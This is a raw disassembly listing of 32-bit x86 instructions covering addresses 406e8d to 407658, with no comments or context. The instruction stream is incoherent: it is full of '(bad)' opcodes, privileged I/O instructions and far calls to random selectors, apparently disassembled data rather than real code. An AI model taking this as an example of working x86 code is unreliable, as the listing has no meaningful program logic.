  406e8d:	adc    BYTE PTR [edi],bh
  406e8f:	sbb    ax,0xda37
  406e93:	fsubr  st(2),st
  406e95:	push   cs
  406e96:	fwait
  406e97:	xchg   esi,eax
  406e98:	ss retf 
  406e9a:	into   
  406e9b:	push   ecx
  406e9c:	jo     0x406efb
  406e9e:	xor    edx,edi
  406ea0:	pop    ebp
  406ea1:	inc    edi
  406ea2:	xchg   ebx,eax
  406ea3:	aam    0xc2
  406ea5:	imul   ecx,DWORD PTR [ebp-0x2c9f9e76],0x57
  406eac:	xchg   ecx,eax
  406ead:	(bad)  
  406eaf:	push   ds
  406eb0:	push   edx
  406eb1:	(bad)  
  406eb2:	cs cmp al,0x75
  406eb5:	ret    
  406eb6:	sub    eax,0x5f911287
  406ebb:	push   ds
  406ebc:	(bad)  
  406ebd:	jo     0x406f19
  406ebf:	test   BYTE PTR [ebx+ebp*4+0x19dba632],dh
  406ec6:	in     al,0x7b
  406ec8:	neg    DWORD PTR [ebx-0x50326bf7]
  406ece:	xchg   esi,eax
  406ecf:	cdq    
  406ed0:	xor    eax,0x3aa122ea
  406ed5:	retf   0x20bb
  406ed8:	add    edx,DWORD PTR [edx]
  406eda:	dec    esi
  406edb:	and    edi,DWORD PTR [ecx]
  406edd:	fcomp  QWORD PTR [esi-0x512d128a]
  406ee3:	nop
  406ee4:	sbb    BYTE PTR ds:0x3f921087,bl
  406eea:	(bad)  
  406eeb:	xor    eax,0xf6ad250
  406ef0:	or     DWORD PTR [eax],eax
  406ef2:	ins    DWORD PTR es:[edi],dx
  406ef3:	inc    edx
  406ef4:	push   es
  406ef5:	mov    cl,0x5a
  406ef7:	hlt    
  406ef8:	adc    al,0x3e
  406efa:	lea    ebx,[eax]
  406efc:	mov    eax,ds:0xfa521e29
  406f01:	call   0xad6:0x9bcb736f
  406f08:	popf   
  406f09:	dec    edx
  406f0a:	lods   eax,DWORD PTR gs:[esi]
  406f0c:	cmp    ch,BYTE PTR [ebp-0x46]
  406f0f:	mov    ah,0x42
  406f11:	or     eax,0x8b2ab293
  406f16:	cmp    DWORD PTR [ebp+esi*8-0x8],eax
  406f1a:	mov    fs,WORD PTR [eax]
  406f1c:	mov    al,0xa9
  406f1e:	jge    0x406f05
  406f20:	repnz ficomp WORD PTR [ecx]
  406f23:	dec    ebp
  406f24:	mov    ds:0x1bd396,al
  406f29:	cs pop ecx
  406f2b:	push   0x7731560b
  406f30:	jne    0x406f31
  406f32:	stos   DWORD PTR es:[edi],eax
  406f33:	or     esi,DWORD PTR [ecx-0x3c]
  406f36:	xor    BYTE PTR [esp+eax*1-0x7ad09a7a],ah
  406f3d:	rcr    BYTE PTR [edi+0x46670083],cl
  406f43:	add    DWORD PTR [esi+0x3b7852d6],edi
  406f49:	and    eax,0x612740fb
  406f4e:	sbb    eax,0x83d95eb2
  406f53:	adc    ebp,edi
  406f55:	imul   esi,DWORD PTR [edx+0x7c191a4a],0xffffffde
  406f5c:	mov    eax,0xc89f6be3
  406f61:	and    BYTE PTR [edi+0x2e],0xfc
  406f65:	test   al,0x52
  406f67:	call   0x3b9a:0x4b40006e
  406f6e:	test   al,0x20
  406f70:	xor    al,0xbe
  406f72:	dec    ebx
  406f73:	mov    DWORD PTR [ebx-0x260222c],ebp
  406f79:	push   cs
  406f7a:	xchg   cl,al
  406f7c:	inc    edi
  406f7d:	ret    
  406f7e:	add    DWORD PTR [eax+0x40da92bc],ebx
  406f84:	clc    
  406f85:	neg    bh
  406f87:	push   ebp
  406f88:	pop    ds
  406f89:	aas    
  406f8a:	jmp    0x406fb3
  406f8c:	test   BYTE PTR fs:[edx+eiz*8],bh
  406f90:	mov    ss,eax
  406f92:	mov    DWORD PTR [edi+0x363c5926],eax
  406f98:	imul   ebx,DWORD PTR [edx+0x417eddd2],0x99093ed8
  406fa2:	fmul   DWORD PTR [ebx-0x80]
  406fa5:	arpl   WORD PTR [ecx+0x78],sp
  406fa8:	xor    DWORD PTR [eax],0x5
  406fab:	or     ah,ch
  406fad:	das    
  406fae:	(bad)  
  406faf:	and    dh,bl
  406fb1:	and    ebp,DWORD PTR [eax-0x43e30919]
  406fb7:	push   eax
  406fb8:	mov    eax,ds:0xea0f1ddf
  406fbd:	pop    edi
  406fbe:	mov    esp,0xb045a77e
  406fc3:	dec    edi
  406fc4:	mov    ebx,0xdeabe754
  406fc9:	dec    esp
  406fca:	in     eax,dx
  406fcb:	add    eax,ebx
  406fcd:	xchg   ebx,eax
  406fce:	ss dec esp
  406fd0:	or     al,0x74
  406fd2:	inc    eax
  406fd3:	test   BYTE PTR [edi+ebp*8],dl
  406fd6:	loopne 0x406feb
  406fd8:	lods   al,BYTE PTR ds:[esi]
  406fd9:	ds (bad) 
  406fdb:	fldcw  WORD PTR [edx-0x6c2ba9a2]
  406fe1:	jp     0x406fe7
  406fe3:	cwde   
  406fe4:	mov    esi,0xeb17a5ae
  406fe9:	pop    ds
  406fea:	add    BYTE PTR [esi+eiz*8],0x83
  406fee:	mov    edi,0x79036a12
  406ff3:	imul   dh
  406ff5:	xchg   edi,eax
  406ff6:	xor    eax,DWORD PTR [ecx-0x626876ae]
  406ffc:	push   cs
  406ffd:	fsub   DWORD PTR ds:0x3658af4e
  407003:	ins    BYTE PTR es:[edi],dx
  407004:	cmp    eax,0x7c9b32c2
  407009:	dec    esi
  40700a:	xor    ecx,DWORD PTR [esi-0x7b14855f]
  407010:	iret   
  407011:	clc    
  407012:	inc    edx
  407013:	push   esi
  407014:	jns    0x406fb1
  407016:	push   es
  407017:	add    eax,0x4cb21b12
  40701c:	or     ecx,DWORD PTR [edx+edx*2+0x30]
  407020:	xlat   BYTE PTR ds:[ebx]
  407021:	es pop ecx
  407023:	pop    ecx
  407024:	js     0x407068
  407026:	fnstenv [eax+0x37]
  407029:	mov    cl,0x5c
  40702b:	(bad)  
  40702c:	ss jg  0x406fe9
  40702f:	adc    bl,BYTE PTR ds:0xa9e8245e
  407035:	pop    ds
  407036:	push   DWORD PTR [ebx]
  407038:	sub    DWORD PTR [ebp-0x15],edx
  40703b:	or     dl,al
  40703d:	(bad)  
  40703e:	adc    BYTE PTR ds:[edi-0x2f51fe8b],ch
  407045:	sbb    esp,ecx
  407047:	or     eax,0x52a14f96
  40704c:	and    eax,0x9a76d5d2
  407051:	xor    al,0x63
  407053:	jnp    0x40705b
  407055:	mov    ecx,0xce927f94
  40705a:	sbb    eax,DWORD PTR [edx]
  40705c:	and    eax,0x8fc6bd3d
  407061:	dec    esp
  407062:	(bad)  
  407063:	in     al,dx
  407064:	add    al,0xfb
  407066:	add    eax,esp
  407068:	cmp    eax,0x9bfad955
  40706d:	leave  
  40706e:	lods   al,BYTE PTR ds:[esi]
  40706f:	push   ecx
  407070:	retf   
  407071:	repz sbb ebx,ebp
  407074:	aam    0xd5
  407076:	repz dec esi
  407078:	ja     0x406fff
  40707a:	push   edx
  40707b:	dec    ebp
  40707c:	in     eax,dx
  40707d:	test   al,0xda
  40707f:	xchg   esi,eax
  407080:	in     eax,dx
  407081:	pop    ss
  407082:	sub    eax,0xace37b16
  407087:	mov    al,0x75
  407089:	dec    esp
  40708a:	push   ecx
  40708b:	dec    eax
  40708c:	mov    bl,0x95
  40708e:	ins    BYTE PTR es:[edi],dx
  40708f:	ins    BYTE PTR es:[edi],dx
  407090:	inc    edx
  407091:	jnp    0x407081
  407093:	cmp    eax,0x9d9d253e
  407098:	(bad)  
  40709a:	(bad)
  40709e:	mov    ds,WORD PTR [ebp-0x1752b65a]
  4070a4:	xchg   esi,eax
  4070a5:	ds lahf 
  4070a7:	mov    esp,0xa8160a52
  4070ac:	mov    gs:0x23081de1,al
  4070b2:	fistp  QWORD PTR [edi]
  4070b4:	or     al,0xcf
  4070b6:	inc    ebp
  4070b7:	test   eax,0x62249d0c
  4070bc:	mov    bl,0x9b
  4070be:	mov    ebx,DWORD PTR [ebx-0x43]
  4070c1:	and    al,ah
  4070c3:	pop    ecx
  4070c4:	loopne 0x40712d
  4070c6:	outs   dx,DWORD PTR ds:[esi]
  4070c7:	xor    ch,BYTE PTR [esi]
  4070c9:	fnstcw WORD PTR [ebx+0x2f]
  4070cc:	mov    al,0xcc
  4070ce:	fstp   QWORD PTR [ebx+edi*2+0x1b]
  4070d2:	mov    eax,DWORD PTR [ebx]
  4070d4:	icebp  
  4070d5:	adc    BYTE PTR [eax+ebx*2+0x6333c4b6],dh
  4070dc:	and    edx,DWORD PTR [ebx-0x58]
  4070df:	test   eax,0x89c7ef15
  4070e4:	xchg   esi,eax
  4070e5:	mov    edx,0x2bddf762
  4070ea:	mov    esp,0xb2be021a
  4070ef:	popf   
  4070f0:	or     ch,ch
  4070f2:	sbb    edi,ecx
  4070f4:	inc    edi
  4070f5:	fisttp WORD PTR [ebx+0x8]
  4070f8:	inc    ebx
  4070f9:	fwait
  4070fa:	hlt    
  4070fb:	sbb    BYTE PTR [ecx+0x9],0x67
  4070ff:	cmc    
  407100:	scas   eax,DWORD PTR es:[edi]
  407101:	cld    
  407102:	cmc    
  407103:	int    0x7c
  407105:	pop    eax
  407106:	fst    QWORD PTR [ebx-0x4a]
  407109:	xor    eax,0x74dd02d7
  40710e:	mov    ecx,0x699e3a69
  407113:	fidiv  DWORD PTR [edx+eax*8+0x6058204d]
  40711a:	ins    BYTE PTR es:[edi],dx
  40711b:	mov    esp,0xf29e01d
  407120:	dec    edx
  407121:	gs ss or al,dl
  407125:	mov    ds:0x72a26ad8,eax
  40712a:	test   DWORD PTR [eax+0x7a],ebx
  40712d:	sub    dh,BYTE PTR [edi+0x7a]
  407130:	jp     0x40719d
  407132:	je     0x4070f9
  407134:	(bad)  
  407136:	xor    ah,al
  407138:	fmul   QWORD PTR [esp+eiz*8-0x7a]
  40713c:	push   edx
  40713d:	adc    BYTE PTR [ebx],dl
  40713f:	lds    esi,FWORD PTR [edx-0x1c]
  407142:	fwait
  407143:	jno    0x40717a
  407145:	sbb    BYTE PTR [eax],bl
  407147:	push   cs
  407148:	bound  ebx,QWORD PTR [edx-0x5b3214b7]
  40714e:	arpl   si,cx
  407150:	mov    esi,DWORD PTR [esi-0x42b0074a]
  407156:	lahf   
  407157:	jmp    0x3500fd9c
  40715c:	dec    esp
  40715d:	iret   
  40715e:	add    BYTE PTR [esi-0x80],al
  407161:	pop    es
  407162:	or     al,0xe0
  407164:	cmp    ah,bl
  407166:	pop    ss
  407167:	rol    DWORD PTR fs:[eax+0x3e],0x3e
  40716c:	jae    0x4071ec
  40716e:	cli    
  40716f:	es mov bh,bl
  407172:	aam    0xb
  407174:	push   eax
  407175:	dec    ebx
  407176:	xchg   esp,eax
  407177:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407178:	cmc    
  407179:	dec    edx
  40717a:	sub    DWORD PTR [esi+edx*4-0x3f],ebx
  40717e:	or     ebp,DWORD PTR [ecx+0x15]
  407181:	jbe    0x407187
  407183:	xchg   edi,eax
  407184:	mov    ds:0xae4f7b00,eax
  407189:	iret   
  40718a:	push   edi
  40718b:	cli    
  40718c:	dec    eax
  40718d:	push   ebp
  40718e:	les    ecx,FWORD PTR [edi+ebp*8]
  407191:	xor    BYTE PTR [eax+eiz*1-0x705ddf23],ah
  407198:	dec    esp
  407199:	popa   
  40719a:	aas    
  40719b:	cmc    
  40719c:	mov    esi,0x7b9963ae
  4071a1:	adc    eax,0xdb2d2af8
  4071a6:	pop    esp
  4071a7:	fdiv   st(2),st
  4071a9:	mov    BYTE PTR gs:[esp+ebx*4+0x44],ah
  4071ae:	outs   dx,DWORD PTR ds:[esi]
  4071b0:	je     0x407170
  4071b2:	icebp  
  4071b3:	addr16 das 
  4071b5:	scas   al,BYTE PTR es:[edi]
  4071b6:	js     0x407206
  4071b8:	jl     0x4071b3
  4071ba:	pop    esi
  4071bb:	fimul  DWORD PTR [edi+ebp*2+0xb9546af]
  4071c2:	pop    eax
  4071c3:	je     0x407146
  4071c5:	(bad)  
  4071c6:	cmp    al,0x3f
  4071c8:	sub    edi,DWORD PTR [eax]
  4071ca:	mov    dh,BYTE PTR [eax+0x68]
  4071cd:	cmp    BYTE PTR [esi+ebp*8],0xa1
  4071d1:	fs push edx
  4071d3:	adc    esi,esp
  4071d5:	dec    eax
  4071d6:	in     eax,0x5
  4071d8:	dec    ebp
  4071d9:	xor    BYTE PTR [edx+0x4b44cff3],ch
  4071df:	adc    bl,ch
  4071e1:	or     BYTE PTR [ebp-0x5792dc31],0xe0
  4071e8:	jb     0x407234
  4071ea:	push   edi
  4071eb:	mov    ds:0xc5b4834,al
  4071f0:	push   esi
  4071f1:	dec    edi
  4071f2:	jmp    0x30f7:0xec1bf06e
  4071f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4071fa:	jecxz  0x407256
  4071fc:	or     bh,BYTE PTR [esi-0x1ceaedd1]
  407202:	cmp    ebp,ebx
  407204:	dec    edi
  407205:	shr    DWORD PTR [ecx+0x5e39f54f],cl
  40720b:	leave  
  40720c:	add    al,0xf
  40720e:	and    al,ah
  407210:	sbb    ebx,DWORD PTR [esi]
  407212:	push   0xffffffec
  407214:	ror    DWORD PTR [edx],cl
  407216:	jae    0x4071c8
  407218:	idiv   BYTE PTR [edx]
  40721a:	bound  eax,QWORD PTR [ecx]
  40721c:	or     al,0xf8
  40721f:	fwait
  407220:	(bad)
  407224:	mov    dl,0xf0
  407226:	mov    eax,0x5499b1ee
  40722b:	mov    cl,0xfd
  40722d:	lds    esi,FWORD PTR [ebx]
  40722f:	out    dx,al
  407230:	mov    esp,0x9baf2af1
  407235:	jo     0x4072a7
  407237:	scas   eax,DWORD PTR es:[edi]
  407238:	mov    DWORD PTR [esi+esi*8+0x52d230b9],ebx
  40723f:	add    ah,BYTE PTR [ecx+0x8]
  407242:	jle    0x4072ad
  407244:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407245:	imul   ebx,DWORD PTR [esi+0x4f],0x5b
  407249:	loopne 0x4072ac
  40724b:	adc    BYTE PTR [edi+0x228c0667],bh
  407251:	push   ebp
  407252:	aam    0xa4
  407254:	push   es
  407255:	je     0x40728e
  407257:	add    al,0x3b
  407259:	xor    dl,BYTE PTR [ecx+0x18fbe7f5]
  40725f:	mov    dl,0x59
  407261:	pushf  
  407262:	adc    BYTE PTR [edx+0x2d],bl
  407265:	repnz shr DWORD PTR [eax],cl
  407268:	xor    ch,BYTE PTR [edx-0x1176f7c]
  40726e:	push   ecx
  40726f:	pop    ecx
  407270:	sbb    esi,DWORD PTR [esi+0x7bba165b]
  407276:	mov    edx,0x8386737d
  40727b:	fsub   DWORD PTR ds:0x18b15b32
  407281:	mov    ds:0xaa9ac7b1,eax
  407286:	mov    ds:0x647d8d82,al
  40728b:	test   eax,0xd7176fa4
  407290:	xor    BYTE PTR [ecx+0xf1cbdd6],cl
  407296:	add    al,0xde
  407298:	cmp    BYTE PTR [eax+0xf580b9c],bh
  40729e:	mov    dl,0xa3
  4072a0:	mov    bl,0x62
  4072a2:	pusha  
  4072a3:	xor    eax,0x8261fade
  4072a8:	push   edi
  4072a9:	fld    DWORD PTR cs:[edi-0x2f5c4e46]
  4072b0:	xor    BYTE PTR [edx+esi*4-0x34],0x60
  4072b5:	cld    
  4072b6:	mov    dh,0xb8
  4072b8:	push   esi
  4072b9:	fimul  WORD PTR [eax+0xf1bf241]
  4072bf:	mov    es,WORD PTR ds:0xc8fc0861
  4072c5:	pop    es
  4072c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072c7:	test   al,0x97
  4072c9:	push   esp
  4072ca:	sbb    DWORD PTR [ebx],esi
  4072cc:	bswap  ecx
  4072ce:	shl    DWORD PTR [ebp+0x6ee2d023],cl
  4072d4:	iret   
  4072d5:	push   edx
  4072d6:	sub    bh,al
  4072d8:	bound  ecx,QWORD PTR ds:0x1186995a
  4072de:	mov    edi,DWORD PTR [esi+0xf]
  4072e1:	std    
  4072e2:	dec    ecx
  4072e3:	retf   
  4072e4:	test   eax,0x7e18ab47
  4072e9:	mov    al,0x3c
  4072eb:	cmp    al,0xc4
  4072ed:	stos   BYTE PTR es:[edi],al
  4072ee:	outs   dx,BYTE PTR ds:[esi]
  4072ef:	fisub  WORD PTR [eax-0x43]
  4072f2:	loopne 0x40728f
  4072f4:	sub    DWORD PTR ds:0xa8645c05,ebx
  4072fa:	aad    0xb6
  4072fc:	stos   DWORD PTR es:[edi],eax
  4072fd:	jg     0x40730e
  4072ff:	pop    ecx
  407300:	repz into 
  407302:	pop    dx
  407304:	mul    BYTE PTR ds:0x9620d263
  40730a:	xchg   edx,eax
  40730b:	inc    ebx
  40730c:	jp     0x4072ad
  40730e:	aas    
  40730f:	data16 fild WORD PTR ds:0x96b48145
  407316:	jg     0x40737e
  407318:	fldcw  WORD PTR [ebp-0x389256b7]
  40731e:	cmc    
  40731f:	lahf   
  407320:	call   0x104:0x61170eac
  407327:	es ret 0x7e34
  40732b:	and    esi,DWORD PTR [ecx+0x5b]
  40732e:	out    0x80,eax
  407330:	ja     0x4072f2
  407332:	jge    0x4072b8
  407334:	adc    ecx,DWORD PTR [ecx-0x4fc8a8c]
  40733a:	popa   
  40733b:	cs in  eax,0x4
  40733e:	xor    bl,cl
  407340:	clc    
  407341:	jmp    FWORD PTR [ebp+ecx*1+0x2b72104e]
  407348:	call   0xd7f82aab
  40734d:	stos   DWORD PTR es:[edi],eax
  40734e:	lahf   
  40734f:	mov    edi,0x85576399
  407354:	inc    ecx
  407355:	test   BYTE PTR [ecx+ebx*8+0x181ee9f5],bh
  40735c:	xor    BYTE PTR [ebx],bl
  40735e:	xchg   edx,eax
  40735f:	adc    eax,0x2502f12
  407364:	aaa    
  407365:	mov    ebp,0xd61a3356
  40736a:	in     eax,0x9
  40736c:	iret   
  40736d:	push   ds
  40736e:	sbb    eax,0x44dab881
  407373:	cmc    
  407374:	cmp    dh,al
  407376:	or     eax,0x2e2085b0
  40737b:	jg     0x407393
  40737d:	xchg   ebp,eax
  40737e:	xchg   ebp,eax
  40737f:	popa   
  407380:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407381:	mov    cl,0x2c
  407383:	popf   
  407384:	or     eax,0xaaa0c00b
  407389:	xchg   ecx,eax
  40738a:	sbb    al,0x77
  40738c:	nop
  40738d:	dec    ecx
  40738e:	shr    BYTE PTR [ecx],cl
  407390:	ret    0x77b7
  407393:	icebp  
  407394:	inc    esp
  407395:	pop    es
  407396:	or     al,0x74
  407398:	lock rcr DWORD PTR [ecx],1
  40739b:	lods   eax,DWORD PTR ds:[esi]
  40739c:	sub    ebp,ebp
  40739e:	ins    DWORD PTR es:[edi],dx
  40739f:	sbb    ch,ah
  4073a1:	add    dl,BYTE PTR [edx-0x4c9c3fe3]
  4073a7:	push   edx
  4073a8:	push   ss
  4073a9:	xchg   edi,eax
  4073aa:	test   al,0xda
  4073ac:	ds test al,0x18
  4073af:	fld    QWORD PTR es:[eax+0x46929232]
  4073b6:	sub    DWORD PTR [edx],ecx
  4073b8:	push   edx
  4073b9:	popf   
  4073ba:	lea    esp,ds:0xbde039cc
  4073c0:	stos   BYTE PTR es:[edi],al
  4073c1:	add    edx,DWORD PTR [esi+eiz*8-0x5a3ded5b]
  4073c8:	sbb    eax,0x515d0ab3
  4073cd:	outs   dx,DWORD PTR ds:[esi]
  4073ce:	ret    
  4073cf:	cmp    bl,BYTE PTR [edi-0x1790584e]
  4073d5:	xchg   edi,eax
  4073d6:	adc    al,0x7d
  4073d8:	ud2    
  4073da:	loop   0x4073be
  4073dc:	sub    BYTE PTR [ebp+0x4548d4fa],ah
  4073e2:	scas   al,BYTE PTR es:[edi]
  4073e3:	in     eax,dx
  4073e4:	(bad)  
  4073e5:	pop    ss
  4073e6:	pop    ss
  4073e7:	sub    ah,dh
  4073e9:	stos   DWORD PTR es:[edi],eax
  4073ea:	(bad)  
  4073eb:	inc    DWORD PTR [ebx+0x23fc1b79]
  4073f1:	push   edi
  4073f2:	lock ins BYTE PTR es:[edi],dx
  4073f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073f5:	sbb    BYTE PTR [ebp-0x3b3212cd],cl
  4073fb:	pusha  
  4073fc:	inc    ebx
  4073fd:	es jns 0x40740d
  407400:	push   ecx
  407401:	ins    DWORD PTR es:[edi],dx
  407402:	pusha  
  407403:	adc    esp,edi
  407405:	mov    ebx,0xb3e2cdf9
  40740a:	xor    ecx,DWORD PTR [ecx+ebx*2]
  40740d:	mov    edi,0x36def388
  407412:	pop    ecx
  407413:	adc    al,BYTE PTR [ecx-0x6c]
  407416:	pop    esp
  407417:	or     DWORD PTR [esi-0x5ef56b38],eax
  40741d:	sar    BYTE PTR [ebp+0x4c],1
  407420:	(bad)  
  407421:	xchg   DWORD PTR [edi-0x5f],ebp
  407424:	xchg   ecx,eax
  407425:	dec    edi
  407426:	mov    cl,0x7c
  407428:	push   edx
  407429:	clc    
  40742a:	ss jbe 0x4073b4
  40742d:	popf   
  40742e:	scas   al,BYTE PTR es:[edi]
  40742f:	dec    ebp
  407430:	in     al,0xbc
  407432:	ins    BYTE PTR es:[edi],dx
  407433:	xor    DWORD PTR [ecx+0x7907e36e],ebp
  407439:	loopne 0x4073e1
  40743b:	pop    esp
  40743c:	xchg   esi,eax
  40743d:	and    eax,0xe9daa85
  407442:	aam    0xc7
  407444:	sub    eax,0x6c3058a9
  407449:	outs   dx,BYTE PTR ds:[esi]
  40744a:	mov    edi,0x1301a03d
  40744f:	pop    ebp
  407450:	dec    eax
  407451:	cli    
  407452:	dec    eax
  407453:	sbb    DWORD PTR [eax+0x5cf6b33f],ebx
  407459:	adc    DWORD PTR [ebx+0x48],edx
  40745c:	stc    
  40745d:	fcomp  QWORD PTR ds:0x58aef71e
  407463:	mov    DWORD PTR [edi+0x0],esi
  407466:	add    al,0x90
  407468:	or     ebx,edi
  40746a:	cld    
  40746b:	mov    BYTE PTR [edx+0x6a],ch
  40746e:	sub    al,0xaa
  407470:	xchg   esi,eax
  407471:	add    esp,DWORD PTR [esi+0x4dd29dc4]
  407477:	jmp    0x194:0xc5088aca
  40747e:	sar    BYTE PTR [esi],cl
  407480:	in     al,dx
  407481:	imul   eax,DWORD PTR [ebx-0x76],0x72
  407485:	push   cs
  407486:	pop    ebp
  407487:	aad    0x97
  407489:	call   DWORD PTR [ecx]
  40748b:	sub    bl,BYTE PTR [ebp-0x7114f8b]
  407491:	ss iret 
  407493:	lods   eax,DWORD PTR ds:[esi]
  407494:	pop    esp
  407495:	sbb    edx,eax
  407497:	add    DWORD PTR [esi+0x33],edi
  40749a:	adc    ebp,DWORD PTR [ecx]
  40749c:	and    dl,cl
  40749e:	rcl    BYTE PTR [edi],cl
  4074a0:	fiadd  WORD PTR [esi]
  4074a2:	push   esi
  4074a3:	scas   al,BYTE PTR es:[edi]
  4074a4:	sbb    ebp,DWORD PTR [ebx-0x1a]
  4074a7:	pushf  
  4074a8:	push   ebx
  4074a9:	pop    esi
  4074aa:	xchg   DWORD PTR [ebp+0x4be78962],ebx
  4074b0:	ins    BYTE PTR es:[edi],dx
  4074b1:	pop    edi
  4074b2:	adc    BYTE PTR [esi-0x9],ah
  4074b5:	mov    BYTE PTR [ecx-0x3be6d316],ch
  4074bb:	mov    bh,0x95
  4074bd:	not    DWORD PTR es:[edx-0x14]
  4074c1:	in     eax,dx
  4074c2:	scas   al,BYTE PTR es:[edi]
  4074c3:	pop    ss
  4074c4:	lahf   
  4074c5:	jbe    0x4074bd
  4074c7:	add    cl,BYTE PTR [ebx]
  4074c9:	mov    edi,0xb627f10b
  4074ce:	mov    dl,BYTE PTR [ebx]
  4074d0:	mov    al,0xf1
  4074d2:	setl   ah
  4074d5:	call   0x201b:0x7aa8d6e2
  4074dc:	in     al,dx
  4074dd:	sbb    DWORD PTR [esi+0x23],ecx
  4074e0:	jge    0x4074bb
  4074e2:	and    al,0xd0
  4074e4:	mul    BYTE PTR [ebx+eax*1-0x6aeaa336]
  4074eb:	and    DWORD PTR [ebx],ebp
  4074ed:	daa    
  4074ee:	add    al,0x10
  4074f0:	outs   dx,DWORD PTR ds:[esi]
  4074f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074f2:	(bad)  
  4074f3:	repz pop edi
  4074f5:	sub    eax,0xfd196fc
  4074fa:	das    
  4074fb:	(bad)  
  4074fc:	jns    0x407506
  4074fe:	nop
  4074ff:	sar    DWORD PTR [ecx+0x62],cl
  407502:	mov    esi,0x76adcbc2
  407507:	in     al,0x8b
  407509:	or     bh,al
  40750b:	out    dx,al
  40750c:	das    
  40750d:	sub    eax,0xa40cbcff
  407512:	pop    ebx
  407513:	add    BYTE PTR [esp+esi*2-0x299b708a],dh
  40751a:	std    
  40751b:	jl     0x40755a
  40751d:	or     eax,0xdb2ac053
  407522:	or     dh,ch
  407524:	inc    ebp
  407525:	inc    edi
  407526:	xchg   edi,eax
  407527:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407528:	cmc    
  407529:	sbb    edx,ebx
  40752b:	adc    bh,BYTE PTR [ebp+0x512b19fe]
  407531:	xchg   esp,eax
  407532:	mov    dh,0x9a
  407534:	xchg   ah,cl
  407536:	(bad)  
  407537:	std    
  407538:	sbb    eax,0x42df118d
  40753d:	cwde   
  40753e:	sti    
  40753f:	outs   dx,DWORD PTR ds:[esi]
  407540:	mov    ebp,0x27ba26e3
  407545:	cld    
  407546:	je     0x407521
  407548:	outs   dx,BYTE PTR ss:[esi]
  40754a:	stos   DWORD PTR es:[edi],eax
  40754b:	enter  0xf861,0x8b
  40754f:	adc    esi,DWORD PTR [esi+0x13]
  407552:	clc    
  407553:	pop    ecx
  407554:	scas   eax,DWORD PTR es:[edi]
  407555:	addr16 jbe 0x4075a3
  407558:	(bad)  
  407559:	xlat   BYTE PTR ds:[ebx]
  40755a:	data16 out 0xa3,al
  40755d:	bound  ecx,QWORD PTR [eax+0x26]
  407560:	push   ebp
  407561:	xor    ecx,DWORD PTR [ecx-0x3eebe5af]
  407567:	cmp    al,0x8a
  407569:	adc    dh,ch
  40756b:	pusha  
  40756c:	test   al,0x53
  40756e:	pop    es
  40756f:	jle    0x4075a5
  407571:	push   edi
  407572:	in     al,0x98
  407574:	lock xchg BYTE PTR [eax-0x7111a48b],cl
  40757b:	adc    DWORD PTR [eax],ebx
  40757d:	mov    BYTE PTR [esi],0x84
  407580:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407581:	jo     0x4075d8
  407583:	(bad)  
  407584:	push   edx
  407585:	jb     0x407542
  407587:	push   ds
  407588:	adc    dh,bh
  40758a:	sbb    BYTE PTR [ecx+0x214cb31b],dh
  407590:	add    esi,DWORD PTR ds:0xcb375192
  407596:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407597:	int    0x7e
  407599:	jge    0x407533
  40759b:	test   DWORD PTR [ebx+0x1500c985],0xc555aa85
  4075a5:	into   
  4075a6:	xchg   BYTE PTR [eax-0x5337b7fb],al
  4075ac:	xlat   BYTE PTR ds:[ebx]
  4075ad:	repnz and ebx,0x29
  4075b1:	cmp    eax,0xa3be0d9
  4075b6:	push   edi
  4075b7:	sub    ebp,DWORD PTR [esi-0x54a26225]
  4075bd:	dec    ebp
  4075be:	sbb    ebp,DWORD PTR [esi+0x71]
  4075c1:	or     BYTE PTR [eax+edx*1],ah
  4075c4:	push   edi
  4075c5:	jae    0x407623
  4075c7:	push   eax
  4075c8:	sti    
  4075c9:	ins    BYTE PTR es:[edi],dx
  4075ca:	test   DWORD PTR [eax+0xe],eax
  4075cd:	pop    edi
  4075ce:	add    BYTE PTR [eax-0x22],cl
  4075d1:	scas   al,BYTE PTR es:[edi]
  4075d2:	jge    0x4075ca
  4075d4:	jbe    0x4075eb
  4075d6:	aaa    
  4075d7:	js     0x4075b0
  4075d9:	scas   al,BYTE PTR es:[edi]
  4075da:	add    al,0xbb
  4075dc:	and    dl,BYTE PTR [eax+0x52b1293c]
  4075e2:	jne    0x407660
  4075e4:	call   0x7399fd6f
  4075e9:	addr16 add al,0x3
  4075ec:	outs   dx,BYTE PTR ds:[esi]
  4075ed:	jb     0x4075ff
  4075ef:	mov    esp,DWORD PTR [ecx]
  4075f1:	pop    ds
  4075f2:	pop    esi
  4075f3:	cs loopne 0x40762a
  4075f6:	inc    ecx
  4075f7:	or     al,0x38
  4075f9:	mov    edx,0x85f4e39f
  4075fe:	inc    eax
  4075ff:	scas   al,BYTE PTR es:[edi]
  407600:	out    dx,al
  407601:	push   ebp
  407602:	lock lock add BYTE PTR [edi+0x449bc24d],ch
  40760a:	xchg   ebp,eax
  40760b:	int    0x3f
  40760d:	cmc    
  40760e:	or     DWORD PTR [ecx-0x64df13db],edx
  407614:	inc    edi
  407615:	dec    edx
  407616:	arpl   bx,ax
  407618:	div    DWORD PTR [esi+0x40e476b0]
  40761e:	sti    
  40761f:	dec    edx
  407620:	cmc    
  407621:	shl    DWORD PTR [ecx],0xc6
  407624:	ja     0x407691
  407626:	add    eax,0x1948b2ac
  40762b:	xchg   ebx,eax
  40762c:	jp     0x40769b
  40762e:	push   eax
  40762f:	repnz push esp
  407631:	xchg   ecx,eax
  407632:	push   0x16
  407634:	mov    dh,0xa0
  407636:	or     BYTE PTR [eax-0x18906681],ch
  40763c:	dec    eax
  40763d:	js     0x407604
  40763f:	dec    eax
  407640:	pushf  
  407641:	jnp    0x4075f7
  407643:	mov    bl,0x9a
  407645:	push   0xe8a228c4
  40764a:	retf   
  40764b:	jle    0x407682
  40764d:	nop
  40764e:	jae    0x407663
  407650:	or     esp,edi
  407652:	adc    DWORD PTR [esi+ebx*1],ebp
  407655:	xor    BYTE PTR [ebx-0x3d],dl
  407658:	mov    bl,0xc1
